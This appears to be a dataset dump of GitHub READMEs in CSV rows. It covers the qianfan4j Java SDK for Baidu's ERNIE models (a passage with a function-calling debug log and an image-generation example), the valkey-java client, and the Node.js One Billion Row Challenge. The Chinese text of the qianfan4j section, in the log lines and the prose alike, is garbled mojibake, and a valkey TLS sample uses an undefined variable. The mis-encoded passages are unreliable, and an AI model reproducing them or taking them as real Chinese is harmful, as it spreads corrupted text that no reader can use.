90\n     ]\n }\n"",""thoughts"":""æˆ‘åº”è¯¥æŠŠæ‰€æœ‰äººçš„è¯­æ–‡åˆ†æ•°ä¼ å…¥ï¼Œä»è€Œè®¡ç®—å‡ºè¯­æ–‡çš„å¹³å‡æˆç»©""}}]]},{""name"":""compute_avg_score"",""description"":""è®¡ç®—å¹³å‡æˆç»©"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""åˆ†æ•°é›†åˆ"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""å¹³å‡åˆ†""}}},""examples"":[[{""role"":""user"",""content"":""å¼ ä¸‰çš„è¯­æ–‡30åˆ†ã€æ•°å­¦20åˆ†ã€è‹±è¯­100åˆ†ï¼›\næå››çš„è¯­æ–‡50åˆ†ã€æ•°å­¦90åˆ†ã€è‹±è¯­60åˆ†ï¼›\nè®¡ç®—å¼ ä¸‰çš„å¹³å‡æˆç»©\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""æˆ‘åº”è¯¥å°†å¼ ä¸‰çš„æ‰€æœ‰åˆ†æ•°ä¼ å…¥ï¼Œè®¡ç®—å¼ ä¸‰çš„å¹³å‡åˆ†""}}],[{""role"":""user"",""content"":""å¼ ä¸‰çš„æ•°å­¦æˆç»©æ˜¯50åˆ†ã€è¯­æ–‡30åˆ†ã€è‹±è¯­20åˆ†ï¼›æå››çš„æ•°å­¦æˆç»©æ˜¯60åˆ†ã€è¯­æ–‡90åˆ†ï¼›è¯·è®¡ç®—ä»–ä»¬çš„è¯­æ–‡å¹³å‡æˆç»©""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""æˆ‘åº”è¯¥æŠŠæ‰€æœ‰äººçš„è¯­æ–‡åˆ†æ•°ä¼ å…¥ï¼Œä»è€Œè®¡ç®—å‡ºè¯­æ–‡çš„å¹³å‡æˆç»©""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064974,""sentence_id"":0,""is_end"":false,""is_truncated"":false,""result"":""æ ¹æ®æ‚¨çš„è¦æ±‚"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":0,""total_tokens"":689}}
2024-03-10 18:02:55 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064975,""sentence_id"":1,""is_end"":false,""is_truncated"":false,""result"":""ï¼Œæˆ‘å·²ç»ä½¿ç”¨[compute_avg_score]å·¥å…·è®¡ç®—äº†æå››çš„å¹³å‡åˆ†ã€‚"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":0,""total_tokens"":689}}
2024-03-10 18:02:55 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064976,""sentence_id"":2,""is_end"":false,""is_truncated"":false,""result"":""ä»–çš„å¹³å‡åˆ†æ˜¯75.0åˆ†ã€‚"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":29,""total_tokens"":718}}
2024-03-10 18:02:56 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064977,""sentence_id"":3,""is_end"":false,""is_truncated"":false,""result"":""å¦‚æœæ‚¨è¿˜æœ‰å…¶ä»–é—®é¢˜æˆ–éœ€è¦æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œè¯·éšæ—¶å‘Šè¯‰æˆ‘ã€‚"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":29,""total_tokens"":718}}
2024-03-10 18:02:56 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064977,""sentence_id"":4,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":42,""total_tokens"":731}}
æ ¹æ®æ‚¨çš„è¦æ±‚ï¼Œæˆ‘å·²ç»ä½¿ç”¨[compute_avg_score]å·¥å…·è®¡ç®—äº†æå››çš„å¹³å‡åˆ†ã€‚ä»–çš„å¹³å‡åˆ†æ˜¯75.0åˆ†ã€‚å¦‚æœæ‚¨è¿˜æœ‰å…¶ä»–é—®é¢˜æˆ–éœ€è¦æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œè¯·éšæ—¶å‘Šè¯‰æˆ‘ã€‚
```

åœ¨ä¸€æ¬¡å¯¹è¯ä¸­ï¼Œ`qianfan4j`æ ¹æ®ç”¨æˆ·çš„éœ€æ±‚ï¼Œä½¿ç”¨äº†`query_score`å·¥å…·æ¥æŸ¥è¯¢æå››çš„è¯­æ–‡å’Œæ•°å­¦æˆç»©ï¼Œåˆ†åˆ«æ˜¯80åˆ†å’Œ70åˆ†ï¼Œ 
ç„¶åä½¿ç”¨`compute_avg_score`å·¥å…·æ¥è®¡ç®—ä»–ä»¬çš„è¯­æ–‡å¹³å‡åˆ†ã€‚æœ€ç»ˆï¼ŒåŠ©æ‰‹è¿”å›äº†æå››çš„è¯­æ–‡å’Œæ•°å­¦å¹³å‡åˆ†ä¸º75åˆ†ã€‚

### æ–‡ç”Ÿå›¾ç¤ºä¾‹

`qianfan4j`ä¼šå°†æ–‡å¿ƒä¸€è¨€è¿”å›çš„BASE64ç¼–ç å°è£…ä¸º`BufferedImage`ç±»å‹ï¼Œæ–¹ä¾¿å¼€å‘è€…è¿›è¡Œåç»­çš„å›¾åƒå¤„ç†ã€‚
ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œå±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨`qianfan4j`è¿›è¡Œå›¾åƒå¤„ç†ï¼š

```java
final var request = GenerationImageRequest.newBuilder()
    .model(GenerationImageModel.STABLE_DIFFUSION_XL)
    .prompt(""çŒ«"")
    .negative(""ç™½è‰²"")
    .option(GenerationImageOptions.NUMBERS, 2)
    .option(GenerationImageOptions.SIZE, GenerationImageRequest.Size.S_1024_1024)
    .build();

final var response = client.generationImage(request)
    .async()
    .join();
```

ç„¶åä½ å°±å¯ä»¥é€šè¿‡`response.images().get(0)`æ‹¿åˆ°ç”Ÿæˆçš„å›¾ç‰‡çš„`BufferedImage`ç±»å‹è¿›è¡Œåç»­æ“ä½œäº†ã€‚

![æ–‡ç”Ÿå›¾-çŒ«](https://ompc-images.oss-cn-hangzhou.aliyuncs.com/erniebot4j/gen-image-as-mr0hyfmsix-001.png)

## äº”ã€å‚ä¸è´¡çŒ®

å¦‚æœä½ å¯¹`qianfan4j`æ„Ÿå…´è¶£å¹¶å¸Œæœ›ä¸ºå…¶åšå‡ºè´¡çŒ®ï¼Œè¯·éµå¾ªä»¥ä¸‹æ­¥éª¤ï¼š

1. Forkæœ¬é¡¹ç›®åˆ°ä½ çš„GitHubè´¦æˆ·ã€‚
2. å…‹éš†é¡¹ç›®åˆ°ä½ çš„æœ¬åœ°ç¯å¢ƒã€‚
3. åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†æ”¯ç”¨äºä½ çš„ä¿®æ”¹ã€‚
4. æäº¤ä½ çš„æ›´æ”¹å¹¶é€šè¿‡`Pull Request`è¯·æ±‚åˆå¹¶åˆ°ä¸»åˆ†æ”¯ã€‚

åœ¨æäº¤Pull Requestä¹‹å‰ï¼Œè¯·ç¡®ä¿ä½ çš„ä»£ç ç¬¦åˆé¡¹ç›®çš„ç¼–ç è§„èŒƒå’Œæœ€ä½³å®è·µï¼Œå¹¶ä¸”å·²ç»é€šè¿‡äº†ç›¸å…³çš„æµ‹è¯•ã€‚

## å…­ã€ç‰¹åˆ«è‡´è°¢

é¦–å…ˆï¼Œæˆ‘è¦å‘ç™¾åº¦åƒå¸†å¤§æ¨¡å‹å›¢é˜Ÿçš„åŒå­¦ä»¬è¡¨è¾¾æˆ‘æœ€æ·±åˆ‡åœ°æ„Ÿè°¢ã€‚æ­£æ˜¯ä»–ä»¬ä¸æ‡ˆçš„åŠªåŠ›å’Œå“è¶Šçš„å·¥ä½œæˆæœï¼Œä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿå¦‚æ­¤ä¾¿æ·åœ°åˆ©ç”¨åƒå¸†çš„APIä½¿ç”¨æ–‡å¿ƒä¸€è¨€åœ¨å†…çš„LLMå¤§æ¨¡å‹è¿›è¡Œå¼€å‘ã€‚
ä»–ä»¬ä¸ºæ•´ä¸ªå¼€å‘è€…ç¤¾åŒºæ ‘ç«‹äº†æ¦œæ ·ï¼Œæ¨åŠ¨äº†æŠ€æœ¯çš„è¿›æ­¥ã€‚

### å…³äºæ–‡å¿ƒä¸€è¨€

ä½œä¸ºä¸ªäººä½¿ç”¨è€…ï¼Œæˆ‘å¯¹æ–‡å¿ƒä¸€è¨€è¿™ä¸ªäº§å“æ€€æœ‰æé«˜åœ°è¯„ä»·ã€‚ç›¸è¾ƒäºOpenAiçš„GPT-4ï¼Œè™½ç„¶åœ¨æŸäº›åŠŸèƒ½ä¸Šè¿˜æœ‰å¾…å®Œå–„ï¼Œä½†æ–‡å¿ƒä¸€è¨€åœ¨ç¨³å®šæ€§æ–¹é¢å±•ç°å‡ºäº†æ˜¾è‘—çš„ä¼˜åŠ¿ã€‚
åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå®ƒçš„å¯é å’Œç¨³å®šè®©æˆ‘å€æ„Ÿä¿¡èµ–ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘é€‰æ‹©å®ƒä½œä¸ºå¼€å‘åŸºç¡€çš„é‡è¦åŸå› ä¹‹ä¸€ã€‚

åŒæ—¶æˆ‘ä¹Ÿå¸Œæœ›åœ¨å¤šæ¨¡æ€çš„æ—¶ä»£ï¼Œåƒå¸†å¤§æ¨¡å‹å¹³å°å’Œæ–‡å¿ƒä¸€è¨€ä¸è¦è½åã€‚

### ç¼˜èµ·ä¸åŠ¨æœº

å½“æˆ‘å¾—çŸ¥åƒå¸†å¤§æ¨¡å‹å‘å¸ƒäº†SDKæ—¶ï¼Œæˆ‘è¿«ä¸åŠå¾…åœ°æƒ³è¦é›†æˆåˆ°æˆ‘çš„é¡¹ç›®ä¸­ã€‚ç„¶è€Œï¼Œæˆ‘é—æ†¾åœ°å‘ç°ä»–ä»¬çš„SDKå½“æ—¶å¹¶ä¸æ”¯æŒJavaã€‚
ä½œä¸ºä¸€ä¸ªJavaå¼€å‘è€…ï¼Œæˆ‘æ·±çŸ¥Javaåœ¨å¼€å‘è€…ç¤¾åŒºä¸­çš„æ™®åŠç¨‹åº¦å’Œé‡è¦æ€§ã€‚å› æ­¤ï¼Œæˆ‘å†³å®šè‡ªå·±åŠ¨æ‰‹ï¼Œå¡«è¡¥è¿™ä¸€ç©ºç™½ï¼Œä¸ºJavaå¼€å‘è€…æä¾›ä¸€ä¸ªæ–¹ä¾¿ã€æ˜“ç”¨çš„æ–‡å¿ƒä¸€è¨€å®¢æˆ·ç«¯ã€‚

æ­£æ˜¯åœ¨è¿™æ ·çš„èƒŒæ™¯ä¸‹ï¼Œæˆ‘å‘èµ·äº†`qianfan4j`é¡¹ç›®ã€‚å®ƒæ—¨åœ¨æˆä¸ºæ–‡å¿ƒä¸€è¨€çš„Javaå¼€å‘è€…æœ€ä½³ä¼´ä¾£ï¼Œæä¾›ç®€æ´æ˜äº†çš„APIæ¥å£ï¼Œå¸®åŠ©å¼€å‘è€…å¿«é€Ÿé›†æˆå’Œä½¿ç”¨æ–‡å¿ƒä¸€è¨€çš„åŠŸèƒ½ã€‚
é€šè¿‡`qianfan4j`ï¼ŒJavaå¼€å‘è€…å¯ä»¥è½»æ¾åœ°å®ç°å¯¹è¯ã€ç»­å†™ã€å‘é‡åµŒå…¥å’Œå›¾åƒå¤„ç†ç­‰åŠŸèƒ½ï¼Œæå¤§åœ°æå‡äº†å¼€å‘æ•ˆç‡å’Œç”¨æˆ·ä½“éªŒã€‚

### å±•æœ›ä¸å‘¼å

å±•æœ›æœªæ¥ï¼Œæˆ‘å¸Œæœ›`qianfan4j`èƒ½å¤Ÿæˆä¸ºJavaå¼€å‘è€…ä¸åƒå¸†å¤§æ¨¡å‹å¹³å°ä¹‹é—´çš„æ¡¥æ¢ï¼Œæ¨åŠ¨åƒå¸†å’Œæ–‡å¿ƒä¸€è¨€åœ¨æ›´å¤šé¢†åŸŸçš„åº”ç”¨å’Œå‘å±•ã€‚
åŒæ—¶ï¼Œæˆ‘ä¹Ÿå‘¼åæ›´å¤šçš„å¼€å‘è€…åŠ å…¥åˆ°`qianfan4j`çš„å¼€æºç¤¾åŒºä¸­æ¥ï¼Œå…±åŒå®Œå–„å’Œä¼˜åŒ–è¿™ä¸ªé¡¹ç›®ï¼Œè®©å®ƒæ›´å¥½åœ°æœåŠ¡äºæ•´ä¸ªå¼€å‘è€…ç¤¾åŒºã€‚

## ä¸ƒã€ç›¸å…³é“¾æ¥

- [åƒå¸†å¤§æ¨¡å‹å¹³å°](https://console.bce.baidu.com/qianfan/overview)",1,0,1,0.0,"['java', 'sdk']","['java', 'sdk']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
valkey-io/valkey-java,master,"# Valkey-Java
valkey-java is [Valkey](https://github.com/valkey-io/valkey)'s Java client, derived from [Jedis](https://github.com/redis/jedis) fork, dedicated to maintaining simplicity and high performance.


# Getting started
Add the following dependencies to your `pom.xml` file, you can find the latest version of valkey-java at [Maven Central](https://central.sonatype.com/artifact/io.valkey/valkey-java).
```
<dependency>
    <groupId>io.valkey</groupId>
    <artifactId>valkey-java</artifactId>
    <version>5.3.0</version>
</dependency>
```

## Connect to Valkey

```java
public class ValkeyTest {
    // can be static or singleton, thread safety.
    private static io.valkey.JedisPool jedisPool;

    public static void main(String[] args) {
        io.valkey.JedisPoolConfig config = new io.valkey.JedisPoolConfig();
        // It is recommended that you set maxTotal = maxIdle = 2*minIdle for best performance
        config.setMaxTotal(32);
        config.setMaxIdle(32);
        config.setMinIdle(16);
        jedisPool = new io.valkey.JedisPool(config, < host >, <port >, <timeout >, <password >);
        try (io.valkey.Jedis jedis = jedisPool.getResource()) {
            jedis.set(""key"", ""value"");
            System.out.println(jedis.get(""key""));
        } catch (Exception e) {
            e.printStackTrace();
        }
        jedisPool.close(); // when app exit, close the resource.
    }
}
```

## Connect to the Valkey cluster

```java
import java.util.HashSet;
import java.util.Set;

import io.valkey.HostAndPort;

public class ValkeyClusterTest {
    private static final int DEFAULT_TIMEOUT = 2000;
    private static final int DEFAULT_REDIRECTIONS = 5;
    private static io.valkey.JedisCluster jc; // be static or singleton, thread safety.

    public static void main(String[] args) {
        io.valkey.ConnectionPoolConfig config = new io.valkey.ConnectionPoolConfig();
        // It is recommended that you set maxTotal = maxIdle = 2*minIdle for best performance
        // In cluster mode, please note that each business machine will contain up to maxTotal links,
        // and the total number of connections = maxTotal * number of machines
        config.setMaxTotal(32);
        config.setMaxIdle(32);
        config.setMinIdle(16);

        Set<HostAndPort> jedisClusterNode = new HashSet<HostAndPort>();
        jedisClusterNode.add(new HostAndPort(host, port));
        jc = new io.valkey.JedisCluster(jedisClusterNode, DEFAULT_TIMEOUT, DEFAULT_TIMEOUT, DEFAULT_REDIRECTIONS,
            password, null, config);

        jc.set(""key"", ""value""); // Note that there is no need to call jc.close() here, 
        // the connection recycling is actively completed internally.
        System.out.println(jc.get(""key""));

        jc.close(); // when app exit, close the resource.
    }
}
```

## Connect using TLS method

```java
import java.io.FileInputStream;
import java.io.InputStream;
import java.security.KeyStore;
import java.security.SecureRandom;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.TrustManagerFactory;

import org.apache.commons.pool2.impl.GenericObjectPoolConfig;

public class ValkeySSLTest {
    private static SSLSocketFactory createTrustStoreSSLSocketFactory(String jksFile) throws Exception {
        KeyStore trustStore = KeyStore.getInstance(""jks"");
        InputStream inputStream = null;
        try {
            inputStream = new FileInputStream(jksFile);
            trustStore.load(inputStream, null);
        } finally {
            inputStream.close();
        }

        TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(""PKIX"");
        trustManagerFactory.init(trustStore);
        TrustManager[] trustManagers = trustManagerFactory.getTrustManagers();

        SSLContext sslContext = SSLContext.getInstance(""TLS"");
        sslContext.init(null, trustManagers, new SecureRandom());
        return sslContext.getSocketFactory();
    }

    public static void main(String[] args) throws Exception {
        // When you don't have a jks file, just set sslSocketFactory to null.
        final SSLSocketFactory sslSocketFactory = createTrustStoreSSLSocketFactory( < your_jks_file_path >);
        io.valkey.JedisPool jedisPool = new io.valkey.JedisPool(new GenericObjectPoolConfig(), < host >,
            <port >, <timeout >, <password >, 0, true, sslSocketFactory, null, null);

        try (io.valkey.Jedis jedis = pool.getResource()) {
            jedis.set(""key"", ""value"");
            System.out.println(jedis.get(""key""));
        } catch (Exception e) {
            e.printStackTrace();
        }

        jedisPool.close(); // when app exit, close the resource.
    }
}
```

# Pool Configuration
The following are the common parameters of apache common-pool and their meaningsï¼š

| Parameter | Meanings                                                                                                                                                                                                         | Default value | Recommended value              |
| --- |------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------|--------------------------------|
|connectionTimeout| Initialize the timeout period for connecting to the cluster, such as the timeout period for reconnecting the cluster at startup and after the TCP connect is disconnected.                                       | 2000          | 5000                           |
|soTimeout| The timeout period for API access. For example, the timeout period for operations such as set and get.                                                                                                           | 2000          | 2000                           |
|maxTotal/maxIdle/minIdle | standalone mode: the connection to redis; cluster mode: The number of connections to a node in the cluster                                                                                                       | 8ï¼Œ8ï¼Œ0         | MaxTotal = MaxIdle = 2*MinIdle |
|blockWhenExhausted| When the resource pool is used up, whether the caller needs to wait or not. If not, an exception with insufficient connection is returned. The following maxWaitMillis takes effect only when the value is true. | true          | true                           |
|maxWaitMillis| The maximum wait time (in milliseconds) of the caller when the resource pool connection is exhausted.                                                                                                            | -1            | depending on your business     |
|testOnBorrow| Whether to check the validity of the connection (send the ping command) when borrowing the connection from the resource pool. The detected invalid connection will be removed.                                   | false         | false                          |
|testOnReturn| Whether to check the validity of the connection (send a ping command) when returning the connection to the resource pool. The detected invalid connection will be removed.                                       | false         | false                          |
|testOnCreate| If you create a new connection when borrowing a connection, we recommend that you disable it if you check whether the connection validity is performed (send a ping command).                                    | false         | false                          |
|testWhileIdle| Whether to check the validity of the connection (send a ping command) when detecting idle connections. If the connection is invalid, it will be closed.                                                          | true          | true                           |
|timeBetweenEvictionRunsMillis| The detection period of idle resources. Unit: milliseconds.                                                                                                                                                      | 30000         | 30000                          |
|minEvictableIdleTimeMillis| The minimum idle time (in milliseconds) of resources in the resource pool. When this value is reached, idle resources are removed. Unit: milliseconds.| 60000         | 60000                          |
|numTestsPerEvictionRun|The number of resources that are detected each time when idle resources are detected.| -1            | -1                             |
|evictionPolicy|Set the evict class, including the elimination algorithm. The default implementation is DefaultEvictionPolicy, which is eliminated according to the idle time.|         DefaultEvictionPolicy      |     DefaultEvictionPolicy                           |
|evictionPolicyClassName|Set the evict class name. The default implementation is DefaultEvictionPolicy, which is eliminated according to the idle time.|      DefaultEvictionPolicy         |         DefaultEvictionPolicy                       |
|evictorShutdownTimeoutMillis|The default waiting time when you exit the evictor.Unit: milliseconds.    |       10000        |                  10000              |
|fairness|When the connection pool is exhausted, multiple threads may block waiting for resources. If the fairness is true, threads can obtain resources in sequence.|        false       |           false                     |
|lifo|When multiple connections are available in the connection pool, a connection is selected based on this value. (Last in, First out)|         true      |        true                        |

# Roadmap
The following is what we plan to complete in the future
1. Support new API for Valkey
2. Support asynchronous
3. Reduce the number of client links in cluster mode
4. Tracing mode can record the access latency of each API.

# Contribution
Contributions are always welcome. If you discover bugs or have new ideas, please open the issue or submit a PR.

# LICENSE
[MIT](LICENSE)",2,0,5,2.0,"['get', 'start', 'connect', 'valkey', 'connect', 'valkey', 'cluster', 'connect', 'use', 'tl', 'method', 'pool', 'configuration', 'roadmap', 'contribution', 'license']","['connect', 'valkey', 'get', 'start', 'cluster']",1.0,"[com.googlecode.maven-java-formatter-plugin:maven-java-formatter-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
1brc/nodejs,main,"# 1ï¸âƒ£ğŸğŸï¸ The One Billion Row Challenge with Node.js

## About the Challenge

The One Billion Row Challenge (1BRC) is a fun exploration of how far modern Java can be pushed for aggregating one billion rows from a text file.

Later the community created a dedicated @1brc organization to pay more attention to the implementations in other languages. This repository contains and accepts Node.js based implementations.

Grab all your (virtual) threads, reach out to SIMD, optimize your GC, or pull any other trick, and create the fastest implementation for solving this task!

<img src=""1brc.png"" alt=""1BRC"" style=""display: block; margin-left: auto; margin-right: auto; margin-bottom:1em; width: 50%;"">

The text file contains temperature values for a range of weather stations.
Each row is one measurement in the format `<string: station name>;<double: measurement>`, with the measurement value having exactly one fractional digit.
The following shows ten rows as an example:

```
Hamburg;12.0
Bulawayo;8.9
Palembang;38.8
St. John's;15.2
Cracow;12.6
Bridgetown;26.9
Istanbul;6.2
Roseau;34.4
Conakry;31.2
Istanbul;23.0
```

The task is to write a program which reads the file, calculates the min, mean, and max temperature value per weather station, and emits the results on stdout like this
(i.e. sorted alphabetically by station name, and the result values per station in the format `<min>/<mean>/<max>`, rounded to one fractional digit):

```
{Abha=-23.0/18.0/59.2, Abidjan=-16.2/26.0/67.3, AbÃ©chÃ©=-10.0/29.4/69.0, Accra=-10.1/26.4/66.4, Addis Ababa=-23.7/16.0/67.0, Adelaide=-27.8/17.3/58.5, ...}
```

Submit your implementation and become part of the leaderboard!

## Results

| #   | Result (m:s.ms) | Implementation                                                                        | Submitter                                        | Notes                                                                              |
| --- | --------------- | ------------------------------------------------------------------------------------- | ------------------------------------------------ | ---------------------------------------------------------------------------------- |
| 1.  | 00:23.000       | [link](https://github.com/1brc/nodejs/blob/main/src/main/nodejs/Edgar-P-yan/index.js) | [Edgar Pogosyan](https://github.com/Edgar-P-yan) | Multi-threaded, optimized parsing, input-specific `float` to `int` parser, no mmap |
|     | 06:16.000       | [link](https://github.com/1brc/nodejs/blob/main/src/main/nodejs/baseline/index.js)    | [Edgar Pogosyan](https://github.com/Edgar-P-yan) | The baseline, single threaded, naive implementation                                |

See [below](#entering-the-challenge) for instructions how to enter the challenge with your own implementation.

## Prerequisites

1. [Java 21](https://openjdk.org/projects/jdk/21/) to generate the `measurements.txt` files and optionally run tests.
2. Node.js, preferably via nvm (node version manager) must be installed on your system.

## Running the Challenge

This repository contains two programs:

- `dev.morling.onebrc.CreateMeasurements` (invoked via _create_measurements.sh_): Creates the file _measurements.txt_ in the root directory of this project with a configurable number of random measurement values
- `src/main/nodejs/baseline/index.js` (invoked via _calculate_average_baseline.sh_): Calculates the average values for the file _measurements.txt_

Execute the following steps to run the challenge:

1. Build the project using Apache Maven:

   ```
   ./mvnw clean verify
   ```

2. Create the measurements file with 1B rows (just once):

   ```
   ./create_measurements.sh 1000000000
   ```

   This will take a few minutes.
   **Attention:** the generated file has a size of approx. **12 GB**, so make sure to have enough diskspace.

3. Calculate the average measurement values:

   ```
   ./calculate_average_baseline.sh
   ```

   The provided naive example implementation uses the Node.js Streams for processing the file and completes the task in ~6m16s on environment used for [result evaluation](#evaluating-results).
   It serves as the base line for comparing your own implementation.

4. Optimize the heck out of it:

   Adjust the `src/main/nodejs/baseline/index.js` program to speed it up, in any way you see fit (just sticking to a few rules described below).
   Options include parallelizing the computation, memory-mapping different sections of the file concurrently, choosing and tuning the garbage collector, and much more.

## Flamegraph/Profiling

> TODO: add instructions on how to profile node.js programs

## Rules and limits

- No external library dependencies may be used
<!-- - Implementations must be provided as a single source file -->
- The computation must happen at application _runtime_, i.e. you cannot process the measurements file at _build time_
  and just bake the result into the binary
- Input value ranges are as follows:
  - Station name: non null UTF-8 string of min length 1 character and max length 100 bytes (i.e. this could be 100 one-byte characters, or 50 two-byte characters, etc.)
  - Temperature value: non null double between -99.9 (inclusive) and 99.9 (inclusive), always with one fractional digit
- There is a maximum of 10,000 unique station names
- Implementations must not rely on specifics of a given data set, e.g. any valid station name as per the constraints above and any data distribution (number of measurements per station) must be supported

## Entering the Challenge

To submit your own implementation to 1BRC, follow these steps:

- Create a fork of the [1brc/nodejs](https://github.com/1brc/nodejs/) GitHub repository.
- Create a copy of `src/main/nodejs/baseline` directory, rename it to `src/main/nodejs/<your_GH_user>`, e.g. `src/main/nodejs/JohnDoe`.
- Make that implementation fast. Really fast.
- Create a copy of _calculate_average_baseline.sh_, named _calculate_average\_<your_GH_user>.sh_, e.g. _calculate_average_JohnDoe.sh_.
- Adjust that script so that it references your implementation file. If needed, provide any Node.js/V8 runtime arguments.
  Make sure that script does not write anything to standard output other than calculation results.
- Run the test suite by executing _/test.sh <your_GH_user>_; if any differences are reported, fix them before submitting your implementation.
- Create a pull request against the upstream repository, clearly stating
  - The execution time of the program on your system and specs of the same (CPU, number of cores, RAM). This is for informative purposes only, the official runtime will be determined as described below.
- I will run the program and determine its performance as described in the next section, and enter the result to the scoreboard.

**Note:** I reserve the right to not evaluate specific submissions if I feel doubtful about the implementation (I.e. I won't run your Bitcoin miner ;).

<!-- If you'd like to discuss any potential ideas for implementing 1BRC with the community,
you can use the [GitHub Discussions](https://github.com/gunnarmorling/onebrc/discussions) of this repository.
Please keep it friendly and civil. -->

## Evaluating Results

For now results are determined by running the program on a Apple MacBook M1 32GB (10 physical).
The `time` program is used for measuring execution times, i.e. end-to-end times are measured.
Each contender will be run five times in a row.
The slowest and the fastest runs are discarded.
The mean value of the remaining three runs is the result for that contender and will be added to the results table above.
The exact same _measurements.txt_ file is used for evaluating all contenders.

<!-- If you'd like to spin up your own box for testing on Hetzner Cloud, you may find these [set-up scripts](https://github.com/gunnarmorling/cloud-boxes/) (based on Terraform and Ansible) useful.
It has been reported that instances of the CCX33 machine class can significantly vary in terms of performance,
so results are only comparable when obtained from one and the same instance.
Note this will incur cost you are responsible for, I am not going to pay your cloud bill :) -->

<!-- ## Prize

If you enter this challenge, you may learn something new, get to inspire others, and take pride in seeing your name listed in the scoreboard above.
Rumor has it that the winner may receive a unique 1ï¸âƒ£ğŸğŸï¸ t-shirt, too! -->

## FAQ

<!-- _Q: Can I use Kotlin or other JVM languages other than Java?_\
A: No, this challenge is focussed on Java only. Feel free to inofficially share implementations significantly outperforming any listed results, though.

_Q: Can I use non-JVM languages and/or tools?_\
A: No, this challenge is focussed on Java only. Feel free to inofficially share interesting implementations and results though. For instance it would be interesting to see how DuckDB fares with this task.

_Q: I've got an implementationâ€”but it's not in Java. Can I share it somewhere?_\
A: Whilst non-Java solutions cannot be formally submitted to the challenge, you are welcome to share them over in the [Show and tell](https://github.com/gunnarmorling/1brc/discussions/categories/show-and-tell) GitHub discussion area.

_Q: Can I use JNI?_\
A: Submissions must be completely implemented in Java, i.e. you cannot write JNI glue code in C/C++. You could use AOT compilation of Java code via GraalVM though, either by AOT-compiling the entire application, or by creating a native library (see [here](https://www.graalvm.org/22.0/reference-manual/native-image/ImplementingNativeMethodsInJavaWithSVM/). -->

_Q: What is the encoding of the measurements.txt file?_\
A: The file is encoded with UTF-8.

_Q: Can I make assumptions on the names of the weather stations showing up in the data set?_\
A: No, while only a fixed set of station names is used by the data set generator, any solution should work with arbitrary UTF-8 station names
(for the sake of simplicity, names are guaranteed to contain no `;` character).

_Q: Can I copy code from other submissions?_\
A: Yes, you can. The primary focus of the challenge is about learning something new, rather than ""winning"". When you do so, please give credit to the relevant source submissions. Please don't re-submit other entries with no or only trivial improvements.

_Q: Which operating system is used for evaluation?_\
A: macOS Sonoma 14 (see [Evaluating Results](#evaluating-results))

_Q: My solution runs in 2 sec on my machine. Am I the fastest 1BRC-er in the world?_\
A: Probably not :) 1BRC results are reported in wallclock time, thus results of different implementations are only comparable when obtained on the same machine. If for instance an implementation is faster on a 32 core workstation than on the 8 core evaluation instance, this doesn't allow for any conclusions. When sharing 1BRC results, you should also always share the result of running the baseline implementation on the same hardware.

_Q: Why_ 1ï¸âƒ£ğŸğŸï¸ _?_\
A: It's the abbreviation of the project name: **One** **B**illion **R**ow **C**hallenge.

## License

This code base is available under the Apache License, version 2.

## Code of Conduct

Be excellent to each other!
More than winning, the purpose of this challenge is to have fun and learn something new.
